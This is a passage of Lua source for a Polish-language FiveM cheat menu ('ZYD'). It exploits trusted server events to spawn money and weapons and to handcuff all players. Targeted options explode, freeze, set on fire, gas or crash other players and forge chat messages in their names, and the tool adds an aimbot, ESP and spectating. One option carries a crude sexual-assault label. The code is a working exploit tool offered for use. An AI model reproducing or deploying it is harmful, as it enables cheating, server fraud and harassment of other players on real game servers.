		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SNSPISTOL"), 999999, false, true)
		GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_SNSPISTOL_MK2"), 999999, false, true)
        	GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_STUNGUN"), 999999, false, true)
        	print("[Zydsonek] - Bronie")
            end)
        end

        curY = curY + 25


        if self.Painter:Button("~b~Darmowy Hajs ~r~[Risky]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "hajs_jd") then
            CreateThread(function()
		        TriggerServerEvent('esx_sadownik:startSell')
		        TriggerServerEvent('wojtek_kurier:hajszauszkodzone')
		        TriggerServerEvent('wojtus_kurierson:wYpLUc0vIdA')
		        TriggerServerEvent('misiaczek_addKasa', kasalosuj)
		        TriggerServerEvent('wojtek_kurier:hajszanormalna')
		        TriggerServerEvent('esx_vangelico_robbery:endrob', store)
		        TriggerServerEvent('lester:vendita')
		        TriggerServerEvent("tost:zgarnijsiano")
		        TriggerServerEvent('esx_taxijob:success')
		        TriggerServerEvent("esx_YachtHeist:safeRobbed", k, true)
		        TriggerServerEvent("esx_YachtHeist:cashTaken", k, true)
                	TriggerServerEvent("esx_YachtHeist:stealing", k, false)
                	TriggerServerEvent('RouteKurier:Zaplata')
                	TriggerServerEvent('route68zdrapka:wyplacNagrode',10000000)
			TriggerServerEvent('AdminMenu:giveCash', 100000)
			TriggerServerEvent('AdminMenu:giveBank', 100000)
    			TriggerServerEvent('RoutePizza:Zaplata')
			TriggerServerEvent('esx_humanelabs:rob', k)
			TriggerServerEvent('esx_humanelabs:robberycomplete')
			TriggerServerEvent('scrap:job4')
		        PlaySoundFrontend(-1, "Mission_Pass_Notify", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS", 0)
                	PlaySoundFrontend(-1, "Mission_Pass_Notify", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS", 1)
			TriggerServerEvent('smerfikcraft:skup2')
                	print("[Zydsonek] - Hajs")
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Zestawy naprawcze ~g~[Zbieranie]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "naprawki_ciagle") then
            CreateThread(function()
                TriggerServerEvent('esx_mecanojob:startHarvest2')
                print("[Zydsonek] - Zestawy naprawcze [Rozpoczeto]")             
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~b~Zestawy naprawcze ~g~[Zatrzymaj]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "naprawki_stop_action") then
            CreateThread(function()
                TriggerServerEvent('esx_mecanojob:stopHarvest2')
                print("[Zydsonek] - Zestawy naprawcze [Zatrzymano]")             
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~g~Napojenie i pożywienie ~b~[FULL]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "nip") then
            CreateThread(function()
		TriggerEvent("esx_status:set", "hunger", 1000000)
                TriggerEvent("esx_status:set", "thirst", 1000000)
                print("[Zydsonek] - Pozywienie i napojenie [100%]") 
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~g~Dzwiek otwierania/zamykania pojazdu", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "dzwiek") then
            CreateThread(function()
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10, "lock", 100.0)
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "lock", 100.0)
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "zamknij", 100.0)
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10, "zamknij", 100.0)
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10, "unlock", 100.0)
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "unlock", 100.0)
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "otworz", 100.0)
			TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10, "otworz", 100.0)
			TriggerServerEvent('tostKajdany:PlayWithinDistance', 1000000.0, 'cuff', 1.0)
                print("[Zydsonek] - Dzwieki zamykania/otwierania pojazdu") 
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~g~Zakuj wszystkich ~r~[Risky]~w~", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "handcuff") then
            CreateThread(function()

		TriggerServerEvent('esx_policejob:handcuffPasta', GetPlayerServerId(i))
		TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
     		TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
     		TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
   		TriggerServerEvent("cuffServer", GetPlayerServerId(i))
   		TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
 		TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
   		TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
		TriggerServerEvent("bestup_kajdanki:handcuff", GetPlayerServerId(i))
		TriggerServerEvent("tostKajdany:handcuff", GetPlayerServerId(i))
                print("[Zydsonek] - Kajdany ALL") 
            end)
        end

        curY = curY + 25

        if self.Painter:Button("~w~------------", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "stopka") then
            CreateThread(function()
                GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_UNARM"), 999999, false, true)
            end)
        end

        curY = curY + 25
    end)

    ZYD:AddCategory("~g~Ustawienia", function(self, x, y)
        local curY = 5

        if self.Painter:CheckBox("~b~Notyfikacje", self.Config.ShowText, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "text_settings_enabled", false) then
            self.Config.ShowText = not self.Config.ShowText
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Safe Mode", self.Config.SafeMode, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "safe_mode", false) then
            self.Config.SafeMode = not self.Config.SafeMode
            
        end

        curY = curY + 25

        if self.Painter:CheckBox("~b~Printowanie w konsoli", self.Config.UsePrintMessages, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "use_print_images", false) then
            self.Config.UsePrintMessages = not self.Config.UsePrintMessages
            
        end

        curY = curY + 20

        if self.Painter:ListChoice("~g~Przycisk aimbota - Nie zmieniac: ", aimbot_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_key", ZYD:IndexOf(aimbot_keys, self.Config.Player.AimbotKey)) then
            self.Config.Player.AimbotKey = aimbot_keys[list_choices["aimbot_key"].selected]
            
        end

        curY = curY + 25

        if self.Painter:ListChoice("~g~Odblokowanie aimbota - Mozna zmieniac: ", aimbot_keys, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "aimbot_release_key", ZYD:IndexOf(aimbot_keys, self.Config.Player.AimbotReleaseKey), "AimbotReleaseKey") then
            self.Config.Player.AimbotReleaseKey = aimbot_keys[list_choices["aimbot_release_key"].selected]
            
        end
    end)

    ZYD:AddCategory("~r~Wylacz", function(self, x, y)
        ZYD.Showing = false
        ZYD.FreeCam.On = false

        ZYD.Config = {
            Player = {},
            Vehicle = {}
        }

        ZYD:GetFunction("FreezeEntityPosition")(ZYD:GetFunction("PlayerPedId")(), false)
        ZYD.Enabled = false
        ZYD:GetFunction("DestroyCam")(ZYD.FreeCam.Cam)
        ZYD:GetFunction("DestroyCam")(ZYD.SpectateCam)
        ZYD:GetFunction("ClearPedTasks")(ZYD:GetFunction("PlayerPedId")())
        ZYD:DoBlips(true)
    end)

    local scroller_pos
    local scroller_size
    local old_scroller
    local cur_count
    local scroller_max

    function ZYD:GetScrollBasis(count)
        if count <= 30 then
            return 1.0
        elseif count <= 40 then
            return 1.1
        elseif count <= 50 then
            return 1.66
        elseif count <= 60 then
            return 2.22
        elseif count <= 70 then
            return 2.77
        elseif count <= 80 then
            return 3.33
        elseif count <= 90 then
            return 3.88
        elseif count <= 100 then
            return 4.45
        elseif count <= 110 then
            return 5.0
        else
            return count / 13.18
        end
    end

    local halt

    local title_color = {
        r = 255,
        g = 255,
        b = 255
    }

    local mode = 1

    local function _do_title_color()
        if mode == 1 then
            local r, g, b = _lerp(0.025, title_color.r, ZYD.Tertiary[1]), _lerp(0.025, title_color.g, ZYD.Tertiary[2]), _lerp(0.025, title_color.b, ZYD.Tertiary[3])

            if dict.math.abs(ZYD.Tertiary[1] - r) <= 3 and dict.math.abs(ZYD.Tertiary[2] - g) <= 3 and dict.math.abs(ZYD.Tertiary[3] - b) <= 3 then
                mode = 2
            end

            title_color.r = r
            title_color.g = g
            title_color.b = b
        elseif mode == 2 then
            local r, g, b = _lerp(0.025, title_color.r, 255), _lerp(0.025, title_color.g, 255), _lerp(0.025, title_color.b, 255)

            if dict.math.abs(255 - r) <= 3 and dict.math.abs(255 - g) <= 3 and dict.math.abs(255 - b) <= 3 then
                mode = 1
            end

            title_color.r = r
            title_color.g = g
            title_color.b = b
        end
    end

    function ZYD:DrawMenu()
        _do_title_color()

        if self.Painter:Holding(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar") then
            ZYD:GetFunction("SetMouseCursorSprite")(4)
            local x, y = self:TranslateMouse(self.Config.MenuX, self.Config.MenuY, self.MenuW, 15, "drag_bar")
            self.Config.MenuX = x
            self.Config.MenuY = y
        elseif was_dragging == "drag_bar" then
            self.DraggingX = nil
            self.DraggingY = nil
            was_dragging = nil
            
        end


        if self.Config.NotifX and self.Config.NotifY and self.Config.NotifW then
            if self.Painter:Holding(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif") then
                ZYD:GetFunction("SetMouseCursorSprite")(4)
                local x, y = self:TranslateMouse(self.Config.NotifX, self.Config.NotifY, self.Config.NotifW, 30, "drag_notif")
                self.Config.NotifX = x
                self.Config.NotifY = y
            elseif was_dragging == "drag_notif" then
                self.DraggingX = nil
                self.DraggingY = nil
                was_dragging = nil
                
            end
        end

        self:LimitRenderBounds()

        if self.Config.UseBackgroundImage then
            self.Painter:DrawSprite(self.Config.MenuX + (self.MenuW / 2), self.Config.MenuY + (self.MenuH / 2), self.MenuW, self.MenuH, 0.0, "ZYD", "menu_bg", 255, 255, 255, 255, true)
        end

        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY - 38, 90, 33, 10, 10, 10, 200)
        self.Painter:DrawText(self.Name, 4, false, self.Config.MenuX + 2, self.Config.MenuY - 37, 0.4, dict.math.ceil(title_color.r), dict.math.ceil(title_color.g), dict.math.ceil(title_color.b), 255)
        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, self.MenuH, 0, 0, 0, 200)
        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY, self.MenuW, 18, 30, 30, 30, 200)
        self.Painter:DrawRect(self.Config.MenuX, self.Config.MenuY + 16, self.MenuW, 2, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], self.Tertiary[4])
        self.Painter:DrawRect(self.Config.MenuX + 5, self.Config.MenuY + 23, 515 + 113, self.MenuH - 28, 10, 10, 10, 200)
        self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 103, 280, self.MenuH - 108, 10, 10, 10, 200)
        self.Painter:DrawRect(self.Config.MenuX + 525 + 111, self.Config.MenuY + 65, 280, 35, 10, 10, 10, 200)
        self.Painter:DrawRect(self.Config.MenuX + 520 + 113, self.Config.MenuY + 23, 283, 39, 10, 10, 10, 200)
        local list_pos = {}

        if not self.Util:ValidPlayer(self.SelectedPlayer) then
            self.Painter:DrawText("~g~Ilosc graczy: " .. #ZYD.PlayerCache, 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 68, 0.35, 255, 255, 255, 255)

            if not scroller_pos then
                scroller_pos = 0
            end

            local plyY = self.Config.MenuY + 101 - scroller_pos * self:GetScrollBasis(#ZYD.PlayerCache)
            scroller_max = self.MenuH - 120
            scroller_size = old_scroller or scroller_max

            if cur_count ~= #ZYD.PlayerCache then
                scroller_size = scroller_max
                old_scroller = nil
            end

            local _players = ZYD.PlayerCache
            table.sort(_players, sort_func)

            for id, src in dict.pairs(_players) do
                table.insert(list_pos, {
                    id = id,
                    src = src,
                    pos = dict.math.abs(self.Config.MenuY + 101 - plyY)
                })

                local color = {255, 255, 255}

                if friends[ZYD:GetFunction("GetPlayerServerId")(src)] then
                    color = {55, 200, 55}
                end

                if plyY >= (self.Config.MenuY + 92) and plyY <= (self.Config.MenuY + self.MenuH - 30) then
                    if self.Painter:Button("~g~Id: " .. ZYD:GetFunction("GetPlayerServerId")(src) .. " | ~g~Gracz: " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(src)), self.Config.MenuX + 525 + 113, plyY, 5, 5, nil, 20, color[1], color[2], color[3], 255, "player_" .. id, false, 0.35) then
                        self.SelectedPlayer = src
                    end
                else
                    if not old_scroller then
                        scroller_size = self:Clamp(scroller_size - 23, 50, scroller_max)
                    end
                end

                plyY = plyY + 23
            end

            halt = false

            if not old_scroller then
                old_scroller = scroller_size
            end

            if not cur_count then
                cur_count = #ZYD.PlayerCache
            end

            self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108, 8, self.MenuH - 120, 20, 20, 20, 255)
            self.Painter:DrawRect(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, self.Tertiary[1], self.Tertiary[2], self.Tertiary[3], self.Tertiary[4])

            if self.Painter:Hovered(self.Config.MenuX + 5 + 100 + 5 + 415 + 113, self.Config.MenuY + 103, 280, self.MenuH - 108) then
                if ZYD:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELDOWN"]) then
                    scroller_pos = scroller_pos + 8
                    scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
                elseif ZYD:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELUP"]) then
                    scroller_pos = scroller_pos - 8
                    scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
                end
            end

            if self.Painter:Holding(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, "scroll_bar") then
                ZYD:GetFunction("SetMouseCursorSprite")(4)
                local y = ZYD:TranslateScroller(self.Config.MenuY + 68, scroller_size, scroller_pos)
                scrolling = true
                scroller_pos = self:Clamp(y, 0, self.MenuH - 120 - scroller_size)
            else
                scroller_y = nil
                scrolling = false
            end
        else
            self.Painter:DrawText("Gracz: " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(self.SelectedPlayer)) .. " (ID: " .. ZYD:GetFunction("GetPlayerServerId")(self.SelectedPlayer) .. ")", 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 67, 0.35, 255, 255, 255, 255)
            local curY = 3

            if self.Painter:Button("Wroc", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "go_back", false, 0.35) then
                self.SelectedPlayer = nil
                halt = true
            end

            if not halt then
                curY = curY + 20
                local spectate_text = ""

                if self.SpectatingPlayer and ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
                    spectate_text = " [Spectujesz: " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(self.SpectatingPlayer)) .. "]"
                end

                local track_text = ""

                if self.TrackingPlayer and ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
                    track_text = " [TRACKING: " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(self.TrackingPlayer)) .. "]"
                end

                if self.SelectedPlayer ~= ZYD:GetFunction("PlayerId")() then
                    if self.Painter:Button("Teleportuj do gracza", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "teleport_player", false, 0.35) then
                        local ped = ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer)
                        local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                        ZYD:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)

                        if ZYD:GetFunction("IsPedInAnyVehicle")(ped) and ZYD:GetFunction("AreAnyVehicleSeatsFree")(ZYD:GetFunction("GetVehiclePedIsIn")(ped)) then
                            ZYD:GetFunction("SetPedIntoVehicle")(ZYD:GetFunction("PlayerPedId")(), ZYD:GetFunction("GetVehiclePedIsIn")(ped), -2)
                        else
                            ZYD:GetFunction("SetEntityCoords")(ZYD:GetFunction("PlayerPedId")(), coords.x, coords.y, coords.z)
                        end

                        ZYD:AddNotification("SUCCESS", "Teleported to player.")
                    end

                    curY = curY + 20
                end

                if self.SelectedPlayer ~= ZYD:GetFunction("PlayerId")() then
                    if self.Painter:Button("Podazaj za graczem" .. track_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "track_player", false, 0.35) then
                        if self.TrackingPlayer ~= nil and ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
                            ZYD:AddNotification("INFO", "Stopped tracking " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(self.TrackingPlayer)))
                            self.TrackingPlayer = nil
                        else
                            self.TrackingPlayer = self.SelectedPlayer
                            ZYD:AddNotification("INFO", "Tracking " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(self.TrackingPlayer)), 10000)
                        end
                    end

                    curY = curY + 20
                end

                if self.SelectedPlayer ~= ZYD:GetFunction("PlayerId")() then
                    if self.Painter:Button("Spectuj" .. spectate_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "spectate_player", false, 0.35) then
                        if self.SpectatingPlayer ~= nil and ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
                            ZYD:AddNotification("Udane", "Przestano spectowac " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(self.SpectatingPlayer)))
                            ZYD:Spectate(false)
                        else
                            ZYD:Spectate(self.SelectedPlayer)
                            ZYD:AddNotification("Udane", "Spectujesz " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(self.SpectatingPlayer)), 10000)
                        end
                    end

                    curY = curY + 20
                end

                if self.Painter:Button("Wybuchnij gracza", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "explode_player", false, 0.35) then
                    ZYD:GetFunction("AddExplosion")(ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
                    ZYD:AddNotification("Udane", "Gracz wybuchniety.", 10000)
                end

                curY = curY + 20

                if self.Painter:Button(frozen_players[self.SelectedPlayer] and "Odmroz gracza" or "Zamroz gracza", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "freeze_player", false, 0.35) then
                    frozen_players[self.SelectedPlayer] = not frozen_players[self.SelectedPlayer]
                    ZYD:AddNotification("Udane", "Gracz " .. (frozen_players[self.SelectedPlayer] and "frozen" or "unfrozen") .. ".", 10000)
                end

                curY = curY + 20

                if self.Painter:Button("Dodaj wszystkie bronie graczu", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "give_player_all_weapons", false, 0.35) then
                    local ped = ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer)

                    for _, wep in dict.pairs(all_weapons) do
                        ZYD:GetFunction("GiveWeaponToPed")(ped, ZYD:GetFunction("GetHashKey")(wep), 9000, false, true)
                    end

                    ZYD:AddNotification("Udane", "Dodano wszystki bronie.", 10000)
                end

                curY = curY + 20

                if self.Painter:Button("Usun wszystkie bronie graczu", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "remove_player_all_weapons", false, 0.35) then
                    local ped = ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer)

                    for _, wep in dict.pairs(all_weapons) do
                        ZYD:GetFunction("RemoveWeaponFromPed")(ped, ZYD:GetFunction("GetHashKey")(wep), 9000, false, true)
                    end

                    ZYD:AddNotification("Udane", "Usunieto bronie.", 10000)
                end

                curY = curY + 20

                if self.Painter:Button("Zagazuj gracza", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "gas_player", false, 0.35) then
                    ZYD:GasPlayer(self.SelectedPlayer)

                    if not ZYD.Config.SafeMode then
                        ZYD:AddNotification("Udane", "Zagazowano gracza", 10000)
                    end
                end

                curY = curY + 20

                if self.Painter:Button("Poraz gracza pradem", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "taze_player", false, 0.35) then
                    ZYD:TazePlayer(self.SelectedPlayer)
                    ZYD:AddNotification("Udane", "Gracz porazony pradem", 10000)
                end

                curY = curY + 20

                if self.Painter:Button("Woda pod cisnieniem z ziemi", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "hydrant_player", false, 0.35) then
                    ZYD:HydrantPlayer(self.SelectedPlayer)
                    ZYD:AddNotification("Udane", "Gracz potraktowany woda", 10000)
                end

                curY = curY + 20

                if self.Painter:Button("Podpal gracza", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fire_player", false, 0.35) then
                    ZYD:FirePlayer(self.SelectedPlayer)
                    ZYD:AddNotification("Udane", "Podpalono gracza", 10000)
                end

                curY = curY + 20

                if self.Painter:Button("Wyrzuc z pojazdu", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "kick_player_car", false, 0.35) then
                    if not ZYD:GetFunction("IsPedInAnyVehicle")(ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
                        ZYD:AddNotification("Nieudane", "Gracz nie jest w pojezdzie", 5000)
                    else
                        ZYD:GetFunction("ClearPedTasksImmediately")(ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer))
                        ZYD:AddNotification("Udane", "Wyrzucono gracza w pojazdu", 5000)
                    end
                end

                curY = curY + 20
								
                if self.Painter:Button("Zbuguj pojazd gracza", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "disable_player_car", false, 0.35) then
                    if not ZYD:GetFunction("IsPedInAnyVehicle")(ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
                        ZYD:AddNotification("Nieudane", "Gracz nie jest w pojezdzie", 5000)
                    else
                        ZYD:AddNotification("Udane", "Zbugowano pojazd gracza", 5000)
                        ZYD:DisableVehicle(ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("GetPlayerPed")(self.SelectedPlayer)))
                    end
                end

                curY = curY + 20

                if self.Painter:Button("Ruchaj gracza w dupe", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "rape_player", false, 0.35) then
                    ZYD:RapePlayer(self.SelectedPlayer)

                    if not ZYD.Config.SafeMode then
                        ZYD:AddNotification("Udane", "Wyruchano gracza w dupe", 10000)
                    end
                end

                curY = curY + 20
                local friend_text = friends[ZYD:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] and "Usun przyjaciela" or "Oznacz jako przyjaciel"

                if self.Painter:Button(friend_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "friend_toggle", false, 0.35) then
                    friends[ZYD:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] = not friends[ZYD:GetFunction("GetPlayerServerId")(self.SelectedPlayer)]
                end

                curY = curY + 20

                if self.DynamicTriggers["chat"] and self.DynamicTriggers["chat"]["_chat:messageEntered"] then
                    if self.Painter:Button("Falszywa wiadomosc na chacie", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fake_chat_message", false, 0.35) then
                        local ZYDM = ZYD:GetTextInput("Wprowadz wiadomosc do wyslania.", "", 100)
                        local playa = ZYD:GetFunction("GetPlayerName")(self.SelectedPlayer)

                        if ZYDM then
                            ZYD:GetFunction("TriggerServerEvent")(self.DynamicTriggers["chat"]["_chat:messageEntered"], playa, {0, 0x99, 255}, ZYDM)
                            ZYD:AddNotification("Udane", "Wiadomosc wyslana", 10000)
                        end
                    end

                    curY = curY + 20
                end

                if self.Painter:Button("~r~Zcrashuj gracza (Trzymaj shift by zmienic metode)", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "crash_online_player", false, 0.35) then
                    local method = nil

                    if ZYD.Config.SafeMode then
                        ZYD:AddNotification("Nieudane", "Safe mode jest wlaczony - wylacz go jezeli chcesz uzyc tej opcji.")
                    else
                        if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["LEFTSHIFT"]) then
                            local _method = ZYD:GetTextInput("Podaj metode. [object / ped / both]", "both", 10)

                            if _method then
                                method = _method
                                ZYD:AddNotification("Udane", "Uzyto " .. method .. " metody crashowania.")
                            end
                        end

                        ZYD:CrashPlayer(self.SelectedPlayer, nil, method)
                    end
                end
            end
        end

        local curX = self.Config.MenuX + 7

        for _, data in dict.pairs(self.Categories) do
            local size = self.Painter:GetTextWidth(data.Title, 4, 0.34)

            if self.Painter:ListItem(data.Title, curX, self.Config.MenuY + 26, 0, 0, size + 29.6, 20, 0, 0, 0, 200, "category_" .. _) then
                self.Config.CurrentSelection = _
                self.Config.SelectedCategory = "category_" .. _
            end

            curX = curX + size + 29.6 + 2
        end

        if self.Config.CurrentSelection then
            self.Categories[self.Config.CurrentSelection].Build(ZYD, self.Config.MenuX + 5, self.Config.MenuY + 46, 515 + 113, self.MenuH - 28)
        end
    end

    local last_clean = 0

    function ZYD:Cleanup()
        if last_clean <= ZYD:GetFunction("GetGameTimer")() then
            last_clean = ZYD:GetFunction("GetGameTimer")() + 15000
            collectgarbage("collect")
        end
    end

    local was_showing
    local was_invis
    local was_other_invis = {}
    local was_noragdoll
    local was_fastrun
    local walking
    local magic_carpet_obj
    local preview_magic_carpet
    local magic_riding
    local was_infinite_combat_roll
    local was_fakedead
    local fakedead_timer = 0
    local last_afk_move = 0

    CreateThread(function()
        while ZYD.Enabled do
            Wait(0)

            if ZYD.Config.Player.RevealInvisibles then
                for id, src in dict.pairs(ZYD.PlayerCache) do
                    src = dict.tonumber(src)

                    if src ~= PlayerId() then
                        local _ped = ZYD:GetFunction("GetPlayerPed")(src)
                        local where = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
                        local us = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
                        local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(where.x, where.y, where.z, us.x, us.y, us.z)

                        if dist <= 100.0 then
                            local invis = not ZYD:GetFunction("IsEntityVisibleToScript")(_ped)

                            if invis then
                                ZYD:GetFunction("SetEntityLocallyVisible")(_ped, true)
                                ZYD:GetFunction("SetEntityAlpha")(_ped, 150)
                                ZYD:Draw3DText(where.x, where.y, where.z + 0.3, "*PLAYER INVISIBLE*", 255, 55, 55, 255)
                                was_other_invis[src] = true
                            else
                                ZYD:GetFunction("SetEntityAlpha")(_ped, 255)
                                was_other_invis[src] = false
                            end
                        else
                            ZYD:GetFunction("SetEntityAlpha")(_ped, 255)
                            was_other_invis[src] = false
                        end
                    end
                end
            end
        end
    end)

    function ZYD:DoCrosshair()
        if not ZYD.Config.Player.CrossHair then return end
        ZYD.Painter:DrawRect(ZYD:ScrW() / 2 - 1, ZYD:ScrH() / 2 - 7.5, 2, 15, ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], 255)
        ZYD.Painter:DrawRect(ZYD:ScrW() / 2 - 7.5, ZYD:ScrH() / 2 - 1, 15, 2, ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], 255)
    end

    local _was_anti_afk
    local sort_func = function(srcA, srcB) return srcA - srcB end

    CreateThread(function()
        while ZYD.Enabled do
            Wait(0)
            ZYD.PlayerCache = ZYD:GetFunction("GetActivePlayers")()
            local w, h = ZYD:GetFunction("GetActiveScreenResolution")()
            local x, y = ZYD:GetFunction("GetNuiCursorPosition")()
            ZYD._ScrW = w
            ZYD._ScrH = h
            ZYD._MouseX = x
            ZYD._MouseY = y
            if w and h and not ZYD.Config.NotifX and not ZYD.Config.NotifY then
                ZYD.Config.NotifX = w - ZYD.Config.NotifW - 20
                ZYD.Config.NotifY = 20
            end

            if not ZYD.Config.NotifW then
                ZYD.Config.NotifW = 420
            end

            ZYD:Cleanup()
            ZYD:DoESP()
            ZYD:DoAntiAim()
            ZYD:DoVehicleRelated()
            ZYD:DoBlips()
            ZYD:Tracker()
            ZYD:DoFrozen()
            ZYD:DoCrosshair()
            local keyboard_open = ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 2

            if not ZYD:GetFunction("HasStreamedTextureDictLoaded")("commonmenu") then
                ZYD:GetFunction("RequestStreamedTextureDict")("commonmenu")
            end

            ZYD:DrawNotifications()

            if walking and not magic_riding then
                local safe

